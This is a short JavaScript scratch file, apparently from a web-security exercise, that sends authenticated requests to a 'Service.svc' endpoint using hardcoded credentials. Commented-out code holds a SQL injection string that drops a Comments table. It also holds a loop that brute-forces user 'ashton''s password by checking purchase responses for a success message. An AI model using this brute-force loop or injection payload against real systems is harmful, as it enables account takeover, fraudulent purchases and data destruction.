var Surl = "";
var Uname = "name";
//var comment = `hi"); DROP TABLE Comments; --`;
var list = []
list2=["a"]



var xhr = new XMLHttpRequest();
xhr.open(
  "GET",
  `${Surl}/Service.svc/id`,
  true,
  "jbon007",
  "jbon007passwd"
);
//xhr.withCredentials = true;
xhr.addEventListener("readystatechange", function() {
        console.log(this.responseText)
        console.log(this.status);
});
xhr.send();



/*
fetch(`${Uurl}/DairyService.svc/news`, {
  headers: new Headers({
    Accept: "application/json",
  }),
});
breakB =false
console.log("here")
list.forEach(element => {
  var xhr = new XMLHttpRequest();
  xhr.open(
    "GET",
    `${Surl}/Service.svc/buy?id=248309245`,
    true,
    "ashton",
    element
  );
  xhr.withCredentials = true;
  xhr.addEventListener("readystatechange", function() {
    if(this.readyState === 4) {
      if(this.responseText.includes("Fault ")){
      }else{
        if(this.responseText.includes("Thank you for purchasing Fromage frais fruit")){
          document.getElementById("works").innerHTML+=`<br>${element}<br>`;
          console.log(this.responseText)
          breakB = true
        }
      }
    }
  });
  xhr.send();
  //console.log(xhr.status);
});
//*/
